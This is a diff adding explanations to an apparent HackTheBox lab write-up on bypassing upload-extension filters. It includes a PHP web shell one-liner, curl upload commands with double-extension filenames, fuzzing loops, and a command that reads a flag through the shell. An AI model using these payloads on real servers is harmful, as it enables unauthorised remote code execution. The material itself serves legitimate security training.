@@ -27,6 +27,7 @@ echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/sh.php
 curl -X POST "http://TARGET/upload.php" \
   -F "uploadFile=@/tmp/sh.php;filename=shell.jpg.php"
 ```
+> The `;filename=` override sends a different filename than the actual file on disk. The whitelist sees `.jpg` in the name and allows it; the server stores the file ending in `.php` which Apache executes.
 
 Outcome:
 - Whitelist regex sees `.jpg` in the name → passes
@@ -55,6 +56,7 @@ curl -X POST "http://TARGET/upload.php" \
   -F "uploadFile=@/tmp/sh.php;filename=shell.php.jpg"
 # Result: shell.php.jpg uploaded AND runs as PHP
 ```
+> The whitelist sees the final extension `.jpg` and passes. Apache's PHP handler regex (without a `$` anchor) also matches `.php` inside the name and executes the file as PHP.
 
 Also works with `.phar.jpg`, `.phtml.jpg`, `.pht.jpg` — depending on what extensions the Apache handler config matches.
 
@@ -87,6 +89,7 @@ for char in '%20' '%0a' '%00' '%0d0a' '/' '.\' '.' ':'; do
   done
 done
 ```
+> Generates a wordlist of filenames that inject special characters between extensions. Use this list with Burp Intruder or ffuf against the upload endpoint to find which variant the parser mishandles.
 
 Run via Burp Intruder / ffuf against the upload endpoint.
 
@@ -124,6 +127,7 @@ for name in sh.jpg.php sh.php.jpg sh.phar.jpg sh.phtml.jpg sh.pHp.jpg; do
   echo "[$name] $resp"
 done
 ```
+> Tests several double-extension and case-variant filenames against the upload endpoint. The response text shows which combinations pass both the whitelist and the blacklist.
 
 Results:
 ```
@@ -141,6 +145,7 @@ for name in sh.phar.jpg sh.phtml.jpg sh.pHp.jpg; do
   echo "[$name] ${resp:0:80}"
 done
 ```
+> Confirms which uploaded extensions actually run as PHP. Uploads that passed the filter but return raw PHP source are served as text — not executed.
 
 Results:
 ```
@@ -156,6 +161,7 @@ Results:
 curl -sk "http://154.57.164.74:31466/profile_images/sh.phar.jpg?cmd=cat+/flag.txt"
 # → HTB{1_wh173l157_my53lf}
 ```
+> Reads the flag through the `.phar.jpg` web shell. The file passes the whitelist (ends in `.jpg`) and executes as PHP via Apache's loose FilesMatch regex.
 
 **Flag:** `HTB{1_wh173l157_my53lf}`
 
